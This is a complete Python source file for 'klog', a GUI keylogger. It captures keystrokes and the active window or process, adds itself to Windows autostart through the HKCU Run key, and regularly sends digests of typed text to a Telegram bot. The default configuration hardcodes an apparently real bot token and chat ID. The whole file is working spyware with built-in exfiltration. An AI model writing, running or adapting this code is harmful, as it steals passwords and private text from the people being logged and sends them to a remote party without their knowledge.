import os
import sys
import time
import json
import threading
import tkinter as tk
from tkinter import ttk, scrolledtext, messagebox, filedialog
from datetime import datetime
from pathlib import Path

try:
    from pynput import keyboard
except ImportError:
    sys.exit("pip install pynput")

try:
    import requests
except ImportError:
    sys.exit("pip install requests")

# ================= PATHS =================
APP_DIR = Path.home() / ".klog"
APP_DIR.mkdir(exist_ok=True)
BUFFER_FILE = APP_DIR / "buffer.txt"
HEARTBEAT_FILE = APP_DIR / "heartbeat.log"
KILL_SWITCH = APP_DIR / "kill.switch"
CONFIG_FILE = APP_DIR / "config.json"

DEFAULT_CONFIG = {
    "bot_token": "9205737340:AAFPu-2Aq6LUAwY9F0amYCyGhfQSvCdm5gU",
    "chat_id": "1917196744",
    "interval": 30,
    "include_digits": False,
    "track_windows": True,
}
# =========================================

# ================= THEME =================
THEME = {
    "bg":          "#0d1117",
    "bg_alt":      "#161b22",
    "bg_hover":    "#21262d",
    "border":      "#30363d",
    "fg":          "#c9d1d9",
    "fg_dim":      "#6e7681",
    "accent":      "#3fb950",
    "accent_dim":  "#238636",
    "danger":      "#f85149",
    "rec":         "#f85149",
    "idle":        "#6e7681",
    "font":        ("Consolas", 10),
    "font_s":      ("Consolas", 9),
    "font_xs":     ("Consolas", 8),
    "font_title":  ("Consolas", 12, "bold"),
    "font_stat":   ("Consolas", 13, "bold"),
}
# =========================================


# ---------- Windows helpers ----------
def get_active_window_title():
    if sys.platform != "win32":
        return ""
    try:
        import ctypes
        u = ctypes.windll.user32
        h = u.GetForegroundWindow()
        n = u.GetWindowTextLengthW(h)
        b = ctypes.create_unicode_buffer(n + 1)
        u.GetWindowTextW(h, b, n + 1)
        return b.value
    except Exception:
        return ""


def get_window_process_name():
    if sys.platform != "win32":
        return ""
    try:
        import ctypes
        from ctypes import wintypes
        u = ctypes.windll.user32
        k = ctypes.windll.kernel32
        h = u.GetForegroundWindow()
        pid = wintypes.DWORD()
        u.GetWindowThreadProcessId(h, ctypes.byref(pid))
        PROCESS_QUERY_INFORMATION = 0x0400
        hproc = k.OpenProcess(PROCESS_QUERY_INFORMATION, False, pid)
        if not hproc:
            return ""
        buf = ctypes.create_unicode_buffer(260)
        size = wintypes.DWORD(260)
        k.QueryFullProcessImageNameW(hproc, 0, buf, ctypes.byref(size))
        k.CloseHandle(hproc)
        return Path(buf.value).name if buf.value else ""
    except Exception:
        return ""


def set_autostart(enable):
    if sys.platform != "win32":
        return False, "Windows only"
    try:
        import winreg
        kp = r"Software\Microsoft\Windows\CurrentVersion\Run"
        k = winreg.OpenKey(winreg.HKEY_CURRENT_USER, kp, 0, winreg.KEY_SET_VALUE)
        name = "KLogService"
        if enable:
            cmd = f'"{sys.executable}" "{os.path.abspath(sys.argv[0])}"'
            winreg.SetValueEx(k, name, 0, winreg.REG_SZ, cmd)
        else:
            try:
                winreg.DeleteValue(k, name)
            except FileNotFoundError:
                pass
        winreg.CloseKey(k)
        return True, "OK"
    except Exception as e:
        return False, str(e)


def is_autostart_enabled():
    if sys.platform != "win32":
        return False
    try:
        import winreg
        k = winreg.OpenKey(winreg.HKEY_CURRENT_USER,
                           r"Software\Microsoft\Windows\CurrentVersion\Run",
                           0, winreg.KEY_READ)
        try:
            winreg.QueryValueEx(k, "KLogService")
            return True
        except FileNotFoundError:
            return False
        finally:
            winreg.CloseKey(k)
    except Exception:
        return False


# ==========================================================
class KLogApp:
    def __init__(self, root):
        self.root = root
        self.root.title("klog")
        self.root.geometry("920x740")
        self.root.configure(bg=THEME["bg"])

        self.cfg = self._load_config()

        # Digest tracking
        self.running = False
        self.listener = None
        self.sender_thread = None
        self.start_time = None
        self.stats = {"keys": 0, "sent": 0, "ok": 0, "fail": 0}
        self.lock = threading.Lock()

        # Per-digest-window activity buckets
        self._opened = []          # list of app names opened this window
        self._closed = []          # list of app names closed this window
        self._typed = []           # list of typed chunks (strings)
        self._window_keys = 0      # keys pressed this window
        self._window_start = None  # wall time window started

        # Active window state
        self._active_window = None      # (title, process)
        self._active_window_key = None
        self._typed_in_window = ""      # keys buffered for active window

        # Live preview buffer
        self._live_full = ""
        self._live_events = []

        self._apply_theme()
        self._build_ui()
        self._heartbeat("gui started")

    # ------------------------------------------------------
    def _load_config(self):
        cfg = DEFAULT_CONFIG.copy()
        if CONFIG_FILE.exists():
            try:
                cfg.update(json.loads(CONFIG_FILE.read_text()))
            except Exception:
                pass
        return cfg

    def _save_config(self):
        try:
            CONFIG_FILE.write_text(json.dumps(self.cfg, indent=2))
        except Exception:
            pass

    # ------------------------------------------------------
    def _apply_theme(self):
        s = ttk.Style()
        try:
            s.theme_use("clam")
        except tk.TclError:
            pass

        s.configure(".", background=THEME["bg"], foreground=THEME["fg"],
                    fieldbackground=THEME["bg_alt"], bordercolor=THEME["border"],
                    darkcolor=THEME["bg"], lightcolor=THEME["bg"],
                    troughcolor=THEME["bg_alt"], font=THEME["font"])
        s.configure("TFrame", background=THEME["bg"])
        s.configure("Panel.TFrame", background=THEME["bg_alt"])
        s.configure("TLabel", background=THEME["bg"], foreground=THEME["fg"])
        s.configure("Dim.TLabel", foreground=THEME["fg_dim"])
        s.configure("Panel.TLabel", background=THEME["bg_alt"], foreground=THEME["fg"])
        s.configure("PanelDim.TLabel", background=THEME["bg_alt"], foreground=THEME["fg_dim"])
        s.configure("Title.TLabel", font=THEME["font_title"], foreground=THEME["accent"])
        s.configure("StatValue.TLabel", font=THEME["font_stat"],
                    foreground=THEME["accent"], background=THEME["bg_alt"])
        s.configure("StatLabel.TLabel", font=THEME["font_xs"],
                    foreground=THEME["fg_dim"], background=THEME["bg_alt"])

        s.configure("TButton", background=THEME["bg_alt"], foreground=THEME["fg"],
                    borderwidth=1, relief="flat", padding=(12, 5), font=THEME["font"])
        s.map("TButton",
              background=[("active", THEME["bg_hover"]), ("disabled", THEME["bg"])],
              foreground=[("active", THEME["accent"]), ("disabled", THEME["fg_dim"])],
              bordercolor=[("active", THEME["accent_dim"])])

        s.configure("Accent.TButton", background=THEME["accent_dim"],
                    foreground="#ffffff", borderwidth=1, relief="flat",
                    padding=(12, 5), font=THEME["font"])
        s.map("Accent.TButton",
              background=[("active", THEME["accent"]), ("disabled", "#1a2c1e")],
              foreground=[("active", "#ffffff"), ("disabled", THEME["fg_dim"])])

        s.configure("Danger.TButton", background="#3d1518", foreground=THEME["danger"],
                    borderwidth=1, relief="flat", padding=(12, 5), font=THEME["font"])
        s.map("Danger.TButton",
              background=[("active", "#5a1e21")],
              foreground=[("active", "#ffffff")])

        s.configure("TNotebook", background=THEME["bg"], borderwidth=0, tabmargins=(0, 6, 0, 0))
        s.configure("TNotebook.Tab", background=THEME["bg"], foreground=THEME["fg_dim"],
                    padding=(20, 8), borderwidth=0, font=THEME["font"])
        s.map("TNotebook.Tab",
              background=[("selected", THEME["bg_alt"])],
              foreground=[("selected", THEME["accent"])],
              expand=[("selected", (0, 0, 0, 0))])

        s.configure("TEntry", fieldbackground=THEME["bg_alt"], foreground=THEME["fg"],
                    insertcolor=THEME["accent"], bordercolor=THEME["border"],
                    lightcolor=THEME["border"], darkcolor=THEME["border"],
                    borderwidth=1, padding=6)
        s.map("TEntry", bordercolor=[("focus", THEME["accent"])])

        s.configure("TCheckbutton", background=THEME["bg"], foreground=THEME["fg"],
                    focuscolor=THEME["bg"])
        s.map("TCheckbutton",
              background=[("active", THEME["bg"])],
              foreground=[("active", THEME["accent"])],
              indicatorcolor=[("selected", THEME["accent"]), ("!selected", THEME["bg_alt"])])

        s.configure("TSpinbox", fieldbackground=THEME["bg_alt"], foreground=THEME["fg"],
                    background=THEME["bg_alt"], arrowcolor=THEME["accent"],
                    bordercolor=THEME["border"])
        s.map("TSpinbox", bordercolor=[("focus", THEME["accent"])])
        s.configure("TSeparator", background=THEME["border"])

    # ------------------------------------------------------
    def _build_ui(self):
        header = tk.Frame(self.root, bg=THEME["bg"], height=64)
        header.pack(fill="x", padx=16, pady=(14, 0))
        header.pack_propagate(False)

        left = tk.Frame(header, bg=THEME["bg"])
        left.pack(side="left", fill="y")
        tk.Label(left, text="klog", bg=THEME["bg"], fg=THEME["accent"],
                 font=("Consolas", 18, "bold")).pack(anchor="w")
        tk.Label(left, text="activity telemetry · apps + typed content",
                 bg=THEME["bg"], fg=THEME["fg_dim"],
                 font=THEME["font_xs"]).pack(anchor="w")

        right = tk.Frame(header, bg=THEME["bg"])
        right.pack(side="right", fill="y")
        self.status_dot = tk.Label(right, text="●", bg=THEME["bg"], fg=THEME["idle"],
                                   font=("Consolas", 16))
        self.status_dot.pack(side="right", padx=(6, 0), pady=14)
        self.status_text = tk.Label(right, text="IDLE", bg=THEME["bg"], fg=THEME["idle"],
                                    font=("Consolas", 11, "bold"))
        self.status_text.pack(side="right", pady=14)

        stats_outer = tk.Frame(self.root, bg=THEME["bg_alt"],
                               highlightbackground=THEME["border"],
                               highlightthickness=1)
        stats_outer.pack(fill="x", padx=16, pady=(12, 0))
        stats = tk.Frame(stats_outer, bg=THEME["bg_alt"])
        stats.pack(fill="x", padx=6, pady=8)

        self.stat_labels = {}
        for key, label in [("keys", "KEYS"), ("sent", "SENT"),
                           ("ok", "OK"), ("fail", "FAIL"), ("uptime", "UPTIME")]:
            f = tk.Frame(stats, bg=THEME["bg_alt"])
            f.pack(side="left", expand=True, fill="x")
            tk.Label(f, text=label, bg=THEME["bg_alt"], fg=THEME["fg_dim"],
                     font=THEME["font_xs"]).pack(anchor="w")
            v = tk.Label(f, text="0", bg=THEME["bg_alt"], fg=THEME["accent"],
                         font=THEME["font_stat"])
            v.pack(anchor="w")
            self.stat_labels[key] = v

        self.nb = ttk.Notebook(self.root)
        self.nb.pack(fill="both", expand=True, padx=16, pady=(12, 0))
        self._build_capture_tab()
        self._build_telegram_tab()
        self._build_system_tab()

        footer = tk.Frame(self.root, bg=THEME["bg"], height=32)
        footer.pack(fill="x", padx=16, pady=(0, 10))
        footer.pack_propagate(False)
        self.footer_left = tk.Label(footer, text="buffer: 0 chars",
                                    bg=THEME["bg"], fg=THEME["fg_dim"],
                                    font=THEME["font_xs"])
        self.footer_left.pack(side="left", pady=8)
        self.footer_right = tk.Label(footer, text="● idle",
                                     bg=THEME["bg"], fg=THEME["fg_dim"],
                                     font=THEME["font_xs"])
        self.footer_right.pack(side="right", pady=8)

    # ------------------------------------------------------
    def _build_capture_tab(self):
        tab = ttk.Frame(self.nb, padding=14)
        self.nb.add(tab, text="CAPTURE")

        ctrl = ttk.Frame(tab)
        ctrl.pack(fill="x", pady=(0, 12))
        self.start_btn = ttk.Button(ctrl, text="▶  START", style="Accent.TButton",
                                    command=self.start_logging)
        self.start_btn.pack(side="left", padx=(0, 8))
        self.stop_btn = ttk.Button(ctrl, text="■  STOP", command=self.stop_logging,
                                   state="disabled")
        self.stop_btn.pack(side="left", padx=8)
        ttk.Button(ctrl, text="SEND NOW", command=self.send_now).pack(side="left", padx=8)
        ttk.Button(ctrl, text="EXPORT", command=self.export_buffer).pack(side="left", padx=8)
        ttk.Button(ctrl, text="CLEAR", style="Danger.TButton",
                   command=self.clear_all).pack(side="left", padx=8)

        filt = ttk.Frame(tab)
        filt.pack(fill="x", pady=(0, 8))
        ttk.Label(filt, text="filter", style="Dim.TLabel").pack(side="left", padx=(0, 8))
        self.filter_var = tk.StringVar()
        self.filter_var.trace_add("write", lambda *_: self._reapply_filter())
        ttk.Entry(filt, textvariable=self.filter_var).pack(side="left", fill="x", expand=True)

        live_wrap = tk.Frame(tab, bg=THEME["border"], highlightthickness=0)
        live_wrap.pack(fill="both", expand=True)
        self.live = scrolledtext.ScrolledText(
            live_wrap, wrap="word", font=("Consolas", 11),
            bg=THEME["bg_alt"], fg=THEME["fg"],
            insertbackground=THEME["accent"],
            selectbackground=THEME["accent_dim"],
            relief="flat", borderwidth=0, padx=12, pady=10)
        self.live.pack(fill="both", expand=True, padx=1, pady=1)
        self.live.configure(state="disabled")
        self.live.tag_config("win", foreground=THEME["accent"], font=("Consolas", 9, "bold"))
        self.live.tag_config("letter", foreground=THEME["fg"])
        self.live.tag_config("open", foreground=THEME["accent"])
        self.live.tag_config("close", foreground=THEME["danger"])

        ttk.Label(tab, text="event log", style="Dim.TLabel").pack(anchor="w", pady=(12, 4))
        log_wrap = tk.Frame(tab, bg=THEME["border"])
        log_wrap.pack(fill="x")
        self.log_widget = scrolledtext.ScrolledText(
            log_wrap, wrap="word", font=THEME["font_s"], height=5,
            bg=THEME["bg_alt"], fg=THEME["fg_dim"],
            insertbackground=THEME["fg"],
            relief="flat", borderwidth=0, padx=10, pady=8)
        self.log_widget.pack(fill="x", padx=1, pady=1)
        self.log_widget.configure(state="disabled")

    # ------------------------------------------------------
    def _build_telegram_tab(self):
        tab = ttk.Frame(self.nb, padding=18)
        self.nb.add(tab, text="TELEGRAM")

        def row(label, widget):
            r = ttk.Frame(tab)
            r.pack(fill="x", pady=6)
            ttk.Label(r, text=label, width=20, style="Dim.TLabel").pack(side="left")
            widget(r)

        self.token_var = tk.StringVar(value=self.cfg["bot_token"])
        self.chat_var = tk.StringVar(value=self.cfg["chat_id"])
        self.interval_var = tk.IntVar(value=self.cfg["interval"])

        row("bot token", lambda p: ttk.Entry(p, textvariable=self.token_var,
                                             show="•").pack(side="left", fill="x", expand=True))
        row("chat id", lambda p: ttk.Entry(p, textvariable=self.chat_var).pack(
            side="left", fill="x", expand=True))
        row("digest interval (s)", lambda p: ttk.Spinbox(p, from_=5, to=3600,
                                                         textvariable=self.interval_var,
                                                         width=10).pack(side="left"))

        btns = ttk.Frame(tab)
        btns.pack(fill="x", pady=(18, 0))
        ttk.Button(btns, text="SAVE", style="Accent.TButton",
                   command=self.save_config).pack(side="left", padx=(0, 8))
        ttk.Button(btns, text="TEST", command=self.test_telegram).pack(side="left")

        ttk.Separator(tab, orient="horizontal").pack(fill="x", pady=22)
        info = (
            "digest format\n"
            "  📊 SESSION DIGEST · HH:MM:SS\n"
            "  🟢 Opened:  app1, app2\n"
            "  🔴 Closed:  app1, app2\n"
            "  ⌨️ Typed Text: what you typed\n"
            "  Total Keys: N\n"
        )
        ttk.Label(tab, text=info, style="Dim.TLabel",
                  font=THEME["font_s"], justify="left").pack(anchor="w")

    # ------------------------------------------------------
    def _build_system_tab(self):
        tab = ttk.Frame(self.nb, padding=18)
        self.nb.add(tab, text="SYSTEM")

        ttk.Label(tab, text="capture modules", style="Title.TLabel").pack(anchor="w", pady=(0, 10))
        self.digits_var = tk.BooleanVar(value=self.cfg["include_digits"])
        self.windows_var = tk.BooleanVar(value=self.cfg["track_windows"])

        ttk.Checkbutton(tab, text="include digits 0-9  (off = letters only)",
                        variable=self.digits_var).pack(anchor="w", pady=3)
        ttk.Checkbutton(tab, text="track active windows (open / close)",
                        variable=self.windows_var).pack(anchor="w", pady=3)

        ttk.Separator(tab, orient="horizontal").pack(fill="x", pady=18)
        ttk.Label(tab, text="persistence", style="Title.TLabel").pack(anchor="w", pady=(0, 10))
        self.autostart_var = tk.BooleanVar(value=is_autostart_enabled())
        ttk.Checkbutton(tab, text="auto-start on login  (HKCU\\Run)",
                        variable=self.autostart_var,
                        command=self._toggle_autostart).pack(anchor="w", pady=3)

        ttk.Separator(tab, orient="horizontal").pack(fill="x", pady=18)
        ttk.Label(tab, text="operator", style="Title.TLabel").pack(anchor="w", pady=(0, 10))
        ttk.Button(tab, text="OPEN DATA DIR",
                   command=self.open_data_dir).pack(anchor="w", pady=3)
        ttk.Button(tab, text="SHOW PATHS",
                   command=self.show_paths).pack(anchor="w", pady=3)
        ttk.Button(tab, text="ARM KILL SWITCH", style="Danger.TButton",
                   command=self.activate_kill_switch).pack(anchor="w", pady=3)

        ttk.Separator(tab, orient="horizontal").pack(fill="x", pady=18)
        ttk.Label(tab, text="system log", style="Dim.TLabel").pack(anchor="w", pady=(0, 4))
        log_wrap = tk.Frame(tab, bg=THEME["border"])
        log_wrap.pack(fill="both", expand=True)
        self.syslog_widget = scrolledtext.ScrolledText(
            log_wrap, height=6, wrap="word", font=THEME["font_s"],
            bg=THEME["bg_alt"], fg=THEME["fg_dim"],
            relief="flat", borderwidth=0, padx=10, pady=8)
        self.syslog_widget.pack(fill="both", expand=True, padx=1, pady=1)
        self.syslog_widget.configure(state="disabled")

    # ------------------------------------------------------
    def log(self, msg):
        def _do():
            ts = time.strftime("%H:%M:%S")
            self.log_widget.configure(state="normal")
            self.log_widget.insert("end", f"[{ts}]  {msg}\n")
            self.log_widget.see("end")
            self.log_widget.configure(state="disabled")
        self.root.after(0, _do)

    def sys_log(self, msg):
        def _do():
            ts = time.strftime("%H:%M:%S")
            self.syslog_widget.configure(state="normal")
            self.syslog_widget.insert("end", f"[{ts}]  {msg}\n")
            self.syslog_widget.see("end")
            self.syslog_widget.configure(state="disabled")
        self.root.after(0, _do)

    def _heartbeat(self, msg):
        try:
            with open(HEARTBEAT_FILE, "a", encoding="utf-8") as f:
                f.write(f"{datetime.now().isoformat()} {msg}\n")
        except Exception:
            pass

    def _update_stats(self):
        def _do():
            self.stat_labels["keys"].configure(text=str(self.stats["keys"]))
            self.stat_labels["sent"].configure(text=str(self.stats["sent"]))
            self.stat_labels["ok"].configure(text=str(self.stats["ok"]))
            self.stat_labels["fail"].configure(text=str(self.stats["fail"]))
            if self.start_time:
                sec = int(time.time() - self.start_time)
                self.stat_labels["uptime"].configure(
                    text=f"{sec//3600:02d}:{(sec%3600)//60:02d}:{sec%60:02d}")
            with self.lock:
                n = self._window_keys
            self.footer_left.configure(text=f"window keys: {n}")
        self.root.after(0, _do)

    # ------------------------------------------------------
    # LIVE PREVIEW
    # ------------------------------------------------------
    def _live_append(self, text, tag="letter"):
        self._live_full += text
        def _do():
            self.live.configure(state="normal")
            self.live.insert("end", text, tag)
            self.live.see("end")
            self.live.configure(state="disabled")
        self.root.after(0, _do)

    def _live_clear(self):
        self._live_full = ""
        def _do():
            self.live.configure(state="normal")
            self.live.delete("1.0", "end")
            self.live.configure(state="disabled")
        self.root.after(0, _do)

    def _reapply_filter(self):
        needle = self.filter_var.get().lower()
        shown = self._live_full
        if needle:
            shown = "\n".join(
                ln for ln in self._live_full.split("\n")
                if needle in ln.lower())

        def _do():
            self.live.configure(state="normal")
            self.live.delete("1.0", "end")
            self.live.insert("end", shown, "letter")
            self.live.see("end")
            self.live.configure(state="disabled")
        self.root.after(0, _do)

    # ------------------------------------------------------
    # ACTIVITY TRACKING
    # ------------------------------------------------------
    def _fmt_window(self, title, proc):
        if proc and title:
            return f"{proc} — {title}"
        return title or proc or "unknown"

    def _flush_typed(self):
        """Flush buffered keystrokes for the current window into the digest bucket."""
        with self.lock:
            typed = self._typed_in_window
            self._typed_in_window = ""
        if typed.strip():
            with self.lock:
                self._typed.append(typed)

    def _check_active_window(self):
        if not self.running or not self.windows_var.get():
            return
        title = get_active_window_title()
        if not title:
            return
        proc = get_window_process_name()
        key = (title, proc)
        if key != self._active_window_key:
            # previous window closed / lost focus
            if self._active_window is not None:
                self._flush_typed()
                prev_proc = self._active_window[1] or self._active_window[0]
                with self.lock:
                    self._closed.append(prev_proc)
                self._live_append(f"\n🔴 CLOSED  {prev_proc}\n", "close")
            # new window opened
            self._active_window = (title, proc)
            self._active_window_key = key
            with self.lock:
                self._opened.append(proc or title)
            self._live_append(f"\n🟢 OPENED  {proc or title}\n", "open")

    # ------------------------------------------------------
    # KEY CAPTURE
    # ------------------------------------------------------
    def _on_press(self, key):
        if not self.running:
            return False
        if KILL_SWITCH.exists():
            self.root.after(0, self.stop_logging)
            return False

        try:
            ch = key.char
        except AttributeError:
            return
        if not ch:
            return
        if not ch.isalpha() and not (self.digits_var.get() and ch.isdigit()):
            return

        with self.lock:
            self._typed_in_window += ch
            self._window_keys += 1
        self.stats["keys"] += 1
        self._live_append(ch, "letter")

    # ------------------------------------------------------
    # DIGEST BUILDER
    # ------------------------------------------------------
    def _build_digest(self):
        """Build the formatted digest message from buckets and reset them."""
        self._flush_typed()
        with self.lock:
            opened = list(self._opened)
            closed = list(self._closed)
            typed = " ".join(self._typed).strip()
            total_keys = self._window_keys

            self._opened = []
            self._closed = []
            self._typed = []
            self._window_keys = 0

        if not opened and not closed and not typed and total_keys == 0:
            return ""

        ts = time.strftime("%H:%M:%S")
        lines = []
        lines.append(f"📊 SESSION DIGEST · {ts}")
        lines.append("━" * 22)

        # Opened
        lines.append("🟢 Opened:")
        if opened:
            for app in opened:
                lines.append(f"  • {app}")
        else:
            lines.append("  • (none)")
        lines.append("")

        # Closed
        lines.append("🔴 Closed:")
        if closed:
            for app in closed:
                lines.append(f"  • {app}")
        else:
            lines.append("  • (none)")
        lines.append("")

        # Typed
        lines.append("⌨️ Typed Text:")
        if typed:
            lines.append(f"  {typed}")
        else:
            lines.append("  (none)")
        lines.append("")

        lines.append("━" * 22)
        lines.append(f"Total Keys: {total_keys}")

        return "\n".join(lines)

    # ------------------------------------------------------
    def _sender_loop(self):
        backoff = 1
        while self.running:
            elapsed = 0
            interval = max(5, int(self.interval_var.get()))
            while elapsed < interval and self.running:
                time.sleep(0.5)
                elapsed += 0.5
                self._check_active_window()
                if KILL_SWITCH.exists():
                    self._heartbeat("kill switch detected")
                    self.root.after(0, self.stop_logging)
                    return

            if not self.running:
                return

            # Close current window for this digest
            if self._active_window is not None:
                self._flush_typed()
                proc = self._active_window[1] or self._active_window[0]
                with self.lock:
                    self._closed.append(proc)
                self._live_append(f"\n🔴 CLOSED  {proc}\n", "close")
                self._active_window = None
                self._active_window_key = None

            digest = self._build_digest()
            if not digest:
                self._live_clear()
                continue

            self.log(f"sending digest ({len(digest)} chars)")
            ok = self._send_telegram(digest)
            if ok:
                self.stats["sent"] += len(digest)
                self.stats["ok"] += 1
                backoff = 1
                self.log(f"digest sent ✓")
                self._persist_buffer("", clear=True)
                self._live_clear()
            else:
                self.stats["fail"] += 1
                self._persist_buffer(digest)
                self.log(f"send failed — retry in {backoff}s")
                for _ in range(backoff):
                    if not self.running:
                        return
                    time.sleep(1)
                backoff = min(backoff * 2, 300)

            self._update_stats()
            self._heartbeat(f"send ok={ok}")

    def _persist_buffer(self, payload, clear=False):
        try:
            if clear:
                if BUFFER_FILE.exists():
                    BUFFER_FILE.unlink()
            else:
                with open(BUFFER_FILE, "a", encoding="utf-8") as f:
                    f.write(payload + "\n\n")
        except Exception:
            pass

    def _send_telegram(self, message):
        token = self.token_var.get().strip()
        chat_id = self.chat_var.get().strip()
        if not token or not chat_id:
            return False
        for chunk in [message[i:i+4000] for i in range(0, len(message), 4000)]:
            url = f"https://api.telegram.org/bot{token}/sendMessage"
            try:
                r = requests.post(url, json={"chat_id": chat_id, "text": chunk,
                                             "parse_mode": "HTML"}, timeout=15)
                if r.status_code != 200:
                    # retry without parse_mode in case of formatting errors
                    r = requests.post(url, json={"chat_id": chat_id, "text": chunk},
                                      timeout=15)
                    if r.status_code != 200:
                        return False
            except Exception:
                return False
        return True

    # ------------------------------------------------------
    def start_logging(self):
        if self.running:
            return
        self.running = True
        self.start_time = time.time()

        # reset window buckets
        with self.lock:
            self._opened = []
            self._closed = []
            self._typed = []
            self._typed_in_window = ""
            self._window_keys = 0

        self.start_btn.configure(state="disabled")
        self.stop_btn.configure(state="normal")
        self.status_text.configure(text="REC", fg=THEME["rec"])
        self.status_dot.configure(fg=THEME["rec"])
        self.footer_right.configure(text="● recording", fg=THEME["accent"])
        self.log("logger started")
        self.sys_log("logger started")

        self._check_active_window()

        self.listener = keyboard.Listener(on_press=self._on_press)
        self.listener.start()

        self.sender_thread = threading.Thread(target=self._sender_loop, daemon=True)
        self.sender_thread.start()

        self._heartbeat("started")
        self._tick()

    def _tick(self):
        if not self.running:
            return
        self._update_stats()
        self.root.after(1000, self._tick)

    def stop_logging(self):
        if not self.running:
            return
        self.running = False

        self._flush_typed()
        if self._active_window is not None:
            proc = self._active_window[1] or self._active_window[0]
            with self.lock:
                self._closed.append(proc)
            self._active_window = None
            self._active_window_key = None

        self.status_text.configure(text="IDLE", fg=THEME["idle"])
        self.status_dot.configure(fg=THEME["idle"])
        self.start_btn.configure(state="normal")
        self.stop_btn.configure(state="disabled")
        self.footer_right.configure(text="● idle", fg=THEME["fg_dim"])
        self.log("logger stopped")
        self.sys_log("logger stopped")

        if self.listener:
            try:
                self.listener.stop()
            except Exception:
                pass
            self.listener = None
        self._heartbeat("stopped")

    def send_now(self):
        digest = self._build_digest()
        if not digest:
            self.log("nothing to send")
            return
        self.log(f"manual digest: {len(digest)} chars")

        def _worker():
            ok = self._send_telegram(digest)
            if ok:
                self.stats["sent"] += len(digest)
                self.stats["ok"] += 1
                self.log("manual send OK")
                self._live_clear()
            else:
                self.stats["fail"] += 1
                self._persist_buffer(digest)
                self.log("manual send FAILED")
            self._update_stats()
        threading.Thread(target=_worker, daemon=True).start()

    def clear_all(self):
        with self.lock:
            self._opened = []
            self._closed = []
            self._typed = []
            self._typed_in_window = ""
            self._window_keys = 0
        self._live_clear()
        self.log_widget.configure(state="normal")
        self.log_widget.delete("1.0", "end")
        self.log_widget.configure(state="disabled")
        self.log("cleared")
        self._persist_buffer("", clear=True)
        self._update_stats()

    def export_buffer(self):
        digest = self._build_digest()
        if not digest:
            messagebox.showinfo("Export", "Nothing to export.")
            return
        path = filedialog.asksaveasfilename(
            defaultextension=".txt",
            initialfile=f"klog_{datetime.now():%Y%m%d_%H%M%S}.txt",
            filetypes=[("Text", "*.txt"), ("All", "*.*")])
        if not path:
            return
        try:
            Path(path).write_text(digest, encoding="utf-8")
            self.log(f"exported: {path}")
        except Exception as e:
            messagebox.showerror("Export", str(e))

    def test_telegram(self):
        self.log("test telegram…")

        def _worker():
            sample = (
                "📊 SESSION DIGEST · " + time.strftime("%H:%M:%S") + "\n"
                "━━━━━━━━━━━━━━━━━━━━\n"
                "🟢 Opened:\n"
                "  • chrome.exe\n"
                "  • explorer.exe\n"
                "  • msedge.exe\n"
                "🔴 Closed:\n"
                "  • chrome.exe\n"
                "  • explorer.exe\n"
                "  • msedge.exe\n"
                "\n"
                "⌨️ Typed Text:\n"
                "  klog test — activity tracking active\n"
                "\n"
                "━━━━━━━━━━━━━━━━━━━━\n"
                "Total Keys: 42"
            )
            ok = self._send_telegram(sample)
            if ok:
                self.log("test OK")
                self.root.after(0, lambda: messagebox.showinfo("Test", "Sent successfully"))
            else:
                self.log("test FAILED")
                self.root.after(0, lambda: messagebox.showerror(
                    "Test", "Failed — check token and chat id"))
        threading.Thread(target=_worker, daemon=True).start()

    def save_config(self):
        self.cfg["bot_token"] = self.token_var.get().strip()
        self.cfg["chat_id"] = self.chat_var.get().strip()
        self.cfg["interval"] = self.interval_var.get()
        self.cfg["include_digits"] = self.digits_var.get()
        self.cfg["track_windows"] = self.windows_var.get()
        self._save_config()
        self.log("config saved")
        self.sys_log("config saved")

    def _toggle_autostart(self):
        ok, msg = set_autostart(self.autostart_var.get())
        if ok:
            self.sys_log(f"autostart {'ON' if self.autostart_var.get() else 'OFF'}")
        else:
            self.autostart_var.set(not self.autostart_var.get())
            messagebox.showerror("Autostart", msg)

    def activate_kill_switch(self):
        if not messagebox.askyesno("Kill switch",
                                   "Arm kill switch? Logger will stop within 1s."):
            return
        try:
            KILL_SWITCH.write_text(datetime.now().isoformat())
            self.sys_log("kill switch armed")
            self.log("kill switch armed")
        except Exception as e:
            messagebox.showerror("Kill switch", str(e))

    def open_data_dir(self):
        try:
            if sys.platform == "win32":
                os.startfile(APP_DIR)
            else:
                import subprocess
                subprocess.Popen(["xdg-open", str(APP_DIR)])
        except Exception as e:
            messagebox.showerror("Open dir", str(e))

    def show_paths(self):
        messagebox.showinfo("Paths",
            f"data dir:     {APP_DIR}\n"
            f"buffer:       {BUFFER_FILE}\n"
            f"heartbeat:    {HEARTBEAT_FILE}\n"
            f"kill switch:  {KILL_SWITCH}\n"
            f"config:       {CONFIG_FILE}")

    def on_close(self):
        self.running = False
        if self.listener:
            try:
                self.listener.stop()
            except Exception:
                pass
        self._heartbeat("gui closed")
        self.root.destroy()


if __name__ == "__main__":
    root = tk.Tk()
    app = KLogApp(root)
    root.protocol("WM_DELETE_WINDOW", app.on_close)
    root.mainloop()